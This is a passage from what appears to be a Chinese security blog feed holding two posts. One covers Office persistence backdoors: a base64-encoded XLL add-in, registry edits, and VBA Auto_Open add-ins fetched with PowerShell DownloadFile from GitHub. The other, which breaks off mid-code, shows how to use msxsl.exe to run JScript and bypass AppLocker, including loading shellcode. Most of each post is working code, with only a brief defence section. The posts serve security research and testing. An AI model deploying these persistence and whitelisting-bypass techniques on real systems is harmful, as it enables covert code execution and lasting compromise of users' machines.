AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 用变量$fileContent存储base64加密的calc.xll 根据.xll文件的释放路径，base64解密并生成calc.xll的代码如下： $fileContent = &quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADVzTnZkaxXipGsV4qRrFeKebNdipWsV4qRrFaKlqxXivOzRIqSrFeKebNcipOsV4p5s1OKkqxXilJpY2iRrFeKAAAAAAAAAABQRQAATAEEAF0ZaFkAAAAAAAAAAOAADiELAQYAAAIAAAAGAAAAAAAAyxAAAAAQAAAAIAAAAAAAEAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAABQAAAABAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAADQIAAARwAAABwgAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAbgEAAAAQAAAAAgAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAABcBAAAAIAAAAAIAAAAGAAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAAwAAAAADAAAAACAAAACAAAAAAAAAAAAAAAAAAAQAAAwC5yZWxvYwAAWgAAAABAAAAAAgAAAAoAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGoBaBAwABD/FQAgABDDkJC4AQAAAMIMAJCQkJCQkJCQi0QkCIXAdQ45BRwwABB+Lv8NHDAAEIsNFCAAEIP4AYsJiQ0gMAAQdT9ogAAAAP8VECAAEIXAWaMoMAAQdQQzwOtmgyAAoSgwABBoBDAAEGgAMAAQoyQwABDo6gAAAP8FHDAAEFlZ6z2FwHU5oSgwABCFwHQwiw0kMAAQVo1x/DvwchKLDoXJdAf/0aEoMAAQg+4E6+pQ/xUIIAAQgyUoMAAQAFleagFYwgwAVYvsU4tdCFaLdQxXi30QhfZ1CYM9HDAAEADrJoP+AXQFg/4CdSKhLDAAEIXAdAlXVlP/0IXAdAxXVlPoFf///4XAdQQzwOtOV1ZT6PX+//+D/gGJRQx1DIXAdTdXUFPo8f7//4X2dAWD/gN1JldWU+jg/v//hcB1AyFFDIN9DAB0EaEsMAAQhcB0CFdWU//QiUUMi0UMX15bXcIMAP8lDCAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdCAAAAAAAACMIAAAlCAAAKAgAACqIAAAAAAAAFggAAAAAAAAAAAAAH4gAAAAIAAAYCAAAAAAAAAAAAAAuiAAAAggAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQgAAAAAAAAjCAAAJQgAACgIAAAqiAAAAAAAADTAldpbkV4ZWMAS0VSTkVMMzIuZGxsAABeAmZyZWUAAA8BX2luaXR0ZXJtAJECbWFsbG9jAACdAF9hZGp1c3RfZmRpdgAATVNWQ1JULmRsbAAAAAAAAAAAAAAAAAAAAABdGWhZAAAAAAIhAAABAAAAAQAAAAEAAAD4IAAA/CAAAAAhAAAAEAAADCEAAAAAdGVzdDMuZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; $fileContentBytes = [System.Convert]::FromBase64String($fileContent) [System.IO.File]::WriteAllBytes($env:APPDATA+&quot;\Microsoft\AddIns\calc.xll&quot;,$fileContentBytes) 通过powershell判断office版本： dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; 回显： Office14 对字符串截取，截取出版本号14，代码如下： $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) 加入异常捕获，如果系统未安装Office，返回提示信息： Try { $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) } Catch { Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; Write-Host &quot;[+] Please reinput a correct path.&quot; } Write-Host &quot;Microsoft Office Version:&quot; $Ver 拼接不同Office版本对应的注册表路径: $ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\Excel\&quot; 新建键：Options New-Item -type Directory $ExcelRegPath&quot;Options&quot; | Out-Null 新建字符串值： OPEN： /R calc.xll : New-ItemProperty $ExcelRegPath&quot;Options&quot; OPEN -value &quot;/R calc.xll&quot; -propertyType string | Out-Null 完整代码如下： $fileContent = &quot;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ZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; $fileContentBytes = [System.Convert]::FromBase64String($fileContent) [System.IO.File]::WriteAllBytes($env:APPDATA+&quot;\Microsoft\AddIns\calc.xll&quot;,$fileContentBytes) Try { $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) } Catch { Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; Write-Host &quot;[+] Please reinput a correct path.&quot; return } Write-Host &quot;Microsoft Office Version:&quot; $Ver $ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\Excel\&quot; New-Item -type Directory $ExcelRegPath&quot;Options&quot; | Out-Null New-ItemProperty $ExcelRegPath&quot;Options&quot; OPEN -value &quot;/R calc.xll&quot; -propertyType string | Out-Null 0x04 Excel VBA add-ins 1、手动测试启动Excel，开启开发工具选项，选择Visual Basic 插入模块，写入以下代码： Sub Auto_Open() Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Exec (&quot;calc.exe&quot;) End Sub 保存为calc.xlam,路径为： %appdata%\Microsoft\Excel\XLSTART 启动Excel.exe，弹出计算器，并且Excel正常启动 2、编写Powershell脚本实现保存路径为： %appdata%\Microsoft\Excel\XLSTART\calc.xlam 对应powershell代码如下： $client = new-object System.Net.WebClient $client.DownloadFile(&quot;https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.xlam&quot;,$env:APPDATA+&quot;\Microsoft\Excel\XLSTART\calc.xlam&quot;) 0x05 PowerPoint VBA add-ins 1、手动测试启动PowerPoint，开启开发工具选项，选择Visual Basic 插入模块，写入以下代码： Sub Auto_Open() Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Exec (&quot;calc.exe&quot;) End Sub 保存为calc.ppa，路径为： %appdata%\Microsoft\AddIns 查找注册表键值： Office2010对应的键值为： HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint Office2013对应的键值为： HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\PowerPoint 新建项AddIns，新建子项calc（对应calc.ppa） 新建DWORD值： Autoload： 1 新建字符串值： Path： calc.ppa 启动PowerPoint.exe，弹出计算器，并且PowerPoint正常启动 2、编写Powershell脚本实现保存路径为： %appdata%\Microsoft\AddIns\calc.ppa 对应powershell代码如下： $client = new-object System.Net.WebClient $client.DownloadFile(&quot;https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa&quot;,$env:APPDATA+&quot;\Microsoft\AddIns\calc.ppa&quot;) 注册表路径：HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint\ Try { $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) } Catch { Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; Write-Host &quot;[+] Please reinput a correct path.&quot; return } Write-Host &quot;Microsoft Office Version:&quot; $Ver $ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\PowerPoint\&quot; 新建键AddIns: New-Item -type Directory $ExcelRegPath&quot;AddIns&quot; | Out-Null 新建键calc: New-Item -type Directory $ExcelRegPath&quot;AddIns\calc&quot; | Out-Null 新建DWORD值： Autoload： 1 New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Autoload -value &quot;1&quot; -propertyType DWORD | Out-Null 新建字符串值： Path： calc.ppa New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Path -value &quot;calc.ppa&quot; -propertyType string | Out-Null 完整代码如下： $client = new-object System.Net.WebClient $client.DownloadFile(&quot;https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa&quot;,$env:APPDATA+&quot;\Microsoft\AddIns\calc.ppa&quot;) Try { $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) } Catch { Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; Write-Host &quot;[+] Please reinput a correct path.&quot; return } Write-Host &quot;Microsoft Office Version:&quot; $Ver $ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\PowerPoint\&quot; New-Item -type Directory $ExcelRegPath&quot;AddIns&quot; | Out-Null New-Item -type Directory $ExcelRegPath&quot;AddIns\calc&quot; | Out-Null New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Autoload -value &quot;1&quot; -propertyType DWORD | Out-Null New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Path -value &quot;calc.ppa&quot; -propertyType string | Out-Null 注： 以上四种方法的利用脚本我已经整合并上传至github，地址为： https://github.com/3gstudent/Office-Persistence 0x06 检测和防御 1、Word禁用所有加载项，如下图 禁用所有控件，如下图 禁用所有宏，如下图 Word WLL依然能够执行 防御方法： 删除信任位置： C:\Users\a\AppData\Roaming\Microsoft\Word\Startup\ 如下图 注： 添加时不能使用环境变量%appdata% 2、ExcelExcel XLL和Excel VBA add-ins: 防御方法： 禁用所有加载项 3、PowerPointPowerPoint VBA add-ins: 防御方法： 禁用所有加载项 0x07 小结 本文介绍了x86系统下Word、Excel、PowerPoint中常用的四种后门利用方式，开源POC脚本以便于测试，最后站在防御角度，介绍了具体的防御方法。x64系统的利用方法作适当修改就好。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use msxsl to bypass AppLocker]]></title>
    <url>%2Fposts%2Fcf6f3aa.html</url>
    <content type="text"><![CDATA[0x00 前言 Casey Smith@subTee在twitter分享的一个技巧，使用包含微软签名的msxsl.exe能够执行JScript代码，从而实现对Applocker的绕过。 如图 twitter地址如下： https://twitter.com/subTee/status/877616321747271680 POC地址如下： https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d 0x01 简介 本文将要对这项技术进行介绍，分析可供进一步利用的方法，同时对其扩展，介绍使用msxsl.exe执行VBScript代码的方式 0x02 msxsl 1、msxsl.exe XSL(Extensible Stylesheet Language)转换器 命令行工具 带有微软数字签名 下载地址： https://www.microsoft.com/en-us/download/details.aspx?id=21714 执行如下图 参考Casey Smith的POC: customers.xml: &lt;?xml version=&quot;1.0&quot;?&gt; &lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;script.xsl&quot; ?&gt; &lt;customers&gt; &lt;customer&gt; &lt;name&gt;John Smith&lt;/name&gt; &lt;address&gt;123 Elm St.&lt;/address&gt; &lt;phone&gt;(123) 456-7890&lt;/phone&gt; &lt;/customer&gt; &lt;customer&gt; &lt;name&gt;Mary Jones&lt;/name&gt; &lt;address&gt;456 Oak Ave.&lt;/address&gt; &lt;phone&gt;(156) 789-0123&lt;/phone&gt; &lt;/customer&gt; &lt;/customers&gt; script.xml: &lt;?xml version=&#39;1.0&#39;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt; &lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt; function xml(nodelist) { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); return nodelist.nextNode().xml; } &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 成功执行JScript代码，弹出计算器，poc执行如下图 开启Applocker，添加规则拦截js脚本的执行，如下图 但是使用msxsl仍然能够执行JScript代码 在之前的文章《利用JS加载.Net程序》介绍过利用JScript脚本加载.Net程序的方法，结合本文，可以得出推论： 使用msxsl也能够执行c#代码 具体来说，能够实现以下功能： 执行shellcode 执行mimikatz 执行powershell脚本 2、执行shellcode可参照Cn33liz的StarFighters，地址如下： https://github.com/Cn33liz/StarFighters/blob/master/StarFighter.js 结合Casey的POC，就能够实现利用msxsl执行shellcode 完整代码我已经上传至github，地址如下： https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml 测试如下图 对于执行mimikatz和powershell脚本，思路可参照之前的文章《利用JS加载.Net程序》 地址如下： https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/ 0x03 脚本优化 分析xml文件格式，对Casey的POC作适当优化 1、精简customers.xmlXML元素命名规则： 名称可以含字母、数字以及其他的字符 名称不能以数字或者标点符号开始 名称不能以字符 “xml”（或者 XML、Xml）开始 名称不能包含空格 可使用任何名称，没有保留的字词 原POC内容如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;script.xsl&quot; ?&gt; &lt;customers&gt; &lt;customer&gt; &lt;name&gt;John Smith&lt;/name&gt; &lt;address&gt;123 Elm St.&lt;/address&gt; &lt;phone&gt;(123) 456-7890&lt;/phone&gt; &lt;/customer&gt; &lt;customer&gt; &lt;name&gt;Mary Jones&lt;/name&gt; &lt;address&gt;456 Oak Ave.&lt;/address&gt; &lt;phone&gt;(156) 789-0123&lt;/phone&gt; &lt;/customer&gt; &lt;/customers&gt; 经分析，参数1中的xml文件不重要，元素可以任意指定 去掉不相关的参数，重新命名一个xml元素，精简后代码如下： &lt;a&gt;&lt;/a&gt; 并且，如果为了少创建文件，使用script.xsl作为第一个xml文件参数也是可以的 例如,参数如下： msxsl.exe script.xsl script.xsl 执行成功，如下图 2、优化script.xsl执行VBScript代码： 注： 经测试，此xml脚本不支持CSharp，同该资料相违背，此问题有待解决 资料地址如下： https://msdn.microsoft.com/en-us/library/533texsx(VS.71).aspx 对于VBScript语言，不支持return表示函数返回值，通过函数名=需要返回的值来表示函数返回值 完整内容如下： &lt;?xml version=&#39;1.0&#39;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; 